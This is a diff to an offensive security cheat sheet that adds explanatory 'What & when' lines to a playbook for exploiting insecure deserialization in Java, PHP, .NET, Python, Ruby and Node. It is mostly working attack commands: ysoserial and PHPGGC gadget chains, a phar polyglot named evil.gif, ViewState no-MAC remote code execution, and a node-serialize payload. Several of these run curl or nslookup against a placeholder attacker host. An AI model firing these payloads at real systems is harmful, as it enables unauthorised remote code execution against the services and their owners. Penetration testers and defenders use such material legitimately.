@@ -7,6 +7,8 @@
 ---
 
 ## 1. Recognize the format (do this first — decides everything)
+*What & when:* the very first move on any blob — read its "made by" stamp to learn the language, which picks your tool
+and gadgets. Run `deser_detect.py` on anything base64-looking in a cookie/token/ViewState; it peels base64+gzip for you.
 ```
 Java ObjectInputStream   hex: AC ED 00 05     b64: rO0AB…      gzip+b64: H4sI…
 PHP serialize()          O:4:"User":2:{…}     a:2:{…}   s:3:"…";  b:1;  i:5;  (phar: "PK…"/"<?php __HALT_COMPILER")
@@ -24,6 +26,8 @@ python3 poc/deser_detect.py --cookie "$COOKIE"
 ```
 
 ## 2. Confirm deserialization SAFELY (blind, no RCE)
+*What & when:* the safe doorbell, used *before* any RCE gadget. URLDNS proves the sink deserializes your input with a
+pure DNS lookup — no code runs, no library needed. If the DNS pings back, you're confirmed; only then escalate.
 ```bash
 # Java URLDNS — DNS lookup on deserialize, NO gadget dependency, NO code exec: the clean first proof
 java -jar ysoserial.jar URLDNS "http://UNIQUE.YOUR-OOB" | base64 -w0
@@ -32,6 +36,9 @@ java -jar ysoserial.jar URLDNS "http://UNIQUE.YOUR-OOB" | base64 -w0
 Tamper test: flip one byte/field → a deserialization stack trace naming ObjectInputStream/unserialize/BinaryFormatter/pickle confirms the sink + language.
 
 ## 3. Java — ysoserial (classpath-dependent → probe then fire)
+*What & when:* your Java RCE vending machine, once URLDNS confirmed the sink. Each chain needs its library on the target,
+so **GadgetProbe first**, then fire the matching one. The JSON/YAML block is for modern APIs (Fastjson/Jackson/SnakeYAML)
+that reach RCE via a JNDI lookup — pair them with the marshalsec server below.
 ```bash
 java -jar ysoserial.jar CommonsCollections5 'nslookup UNIQUE.YOUR-OOB' | base64 -w0
 java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR-OOB/j'   | base64 -w0
@@ -51,6 +58,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://YOUR-OOB:8080/#Exp
 ```
 
 ## 4. PHP — object injection, PHPGGC, phar
+*What & when:* three tiers. Use PHPGGC when you know the framework (ready POP chain → `unserialize()`). Use the manual
+object-edit when the blob *is* a session and you just need auth bypass (flip `b:0`→`b:1`). Use the **phar** builder when
+there's no `unserialize()` but you control a file path the app touches — build the polyglot, upload, trigger a file-op.
 ```bash
 # framework POP chains → the serialized string to inject into unserialize()
 phpggc -l                                        # list: Laravel, Symfony, WordPress, Drupal, Monolog, Guzzle, Yii, CodeIgniter, …
@@ -73,6 +83,9 @@ phpggc -p phar --fast-destruct -pj 'GIF89a' -o evil.gif Monolog/RCE1 system 'cur
 ```
 
 ## 5. .NET — ysoserial.net & ViewState
+*What & when:* ViewState is the headline — try the **no-MAC** case first (drop the key args → unauthenticated RCE). If a
+MAC blocks you, come back once XXE/LFI has fetched the `machineKey` from `web.config`, then supply the key args. The
+BinaryFormatter/LosFormatter and Json.NET blocks cover the other .NET sinks.
 ```bash
 ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "nslookup UNIQUE.YOUR-OOB" -o base64
 ysoserial.exe -f LosFormatter    -g TypeConfuseDelegate -c "cmd /c whoami" -o base64
@@ -92,6 +105,9 @@ Json.NET (TypeNameHandling != None):
 ```
 
 ## 6. Python — pickle / PyYAML / jsonpickle
+*What & when:* the easiest RCE here — reach for `pickle_poc.py` whenever a pickle/YAML sink or a model-file upload
+(`.pkl`/`.pt`/`.joblib`) is in play. `__reduce__` runs your function on load; PyYAML's unsafe loader does the same via
+tags. Keep the command a benign OOB marker.
 ```bash
 python3 poc/pickle_poc.py --cmd 'curl http://YOUR-OOB/py'     # prints base64 pickle (benign marker default)
 ```
@@ -108,6 +124,8 @@ class E:
 > ML model files (`.pkl`,`.pt`,`.joblib`,`.h5`) deserialize via pickle → RCE on load. Uploading/loading a model = a sink.
 
 ## 7. Ruby — Marshal / YAML
+*What & when:* for `Marshal.load`/`YAML.load` sinks (classic Rails). Ruby has a stdlib-only **universal gadget** — no app
+gems required — so a single public generator gives RCE across most versions. Confirm with a callback or `sleep`.
 ```ruby
 # Rails YAML (CVE-2013-0156 family) / Marshal.load — universal gadget (stdlib-only) via public generator:
 # base64 the Marshal payload into the sink; YAML variant uses !ruby/object tags.
@@ -116,12 +134,15 @@ Marshal.load(payload)   # sink;   YAML.load(params[:x])  # sink
 Use the public universal-deserialization-gadget generator (Ruby 2.x/3.x) → RCE; confirm with a callback/`sleep`.
 
 ## 8. Node — node-serialize
+*What & when:* when the blob contains `_$$ND_FUNC$$_`. node-serialize runs the wrapped function as an IIFE on
+`unserialize()` — drop a benign OOB curl inside it. Watch for prototype-pollution gadgets overlapping the same sink.
 ```json
 {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://YOUR-OOB/n',function(){})}()"}
 ```
 base64 → drop into the cookie/param the app passes to `unserialize()`. (Prototype-pollution gadgets often overlap.)
 
 ## 9. Tooling cheat
+*What & when:* the one-line "which tool for which language" map — pick the row that matches the signature you found in §1.
 ```
 ysoserial (Java)        gadget chains for ObjectInputStream + URLDNS (blind confirm)
 ysoserial.net (.NET)    BinaryFormatter/LosFormatter/ViewState/Json.NET gadgets
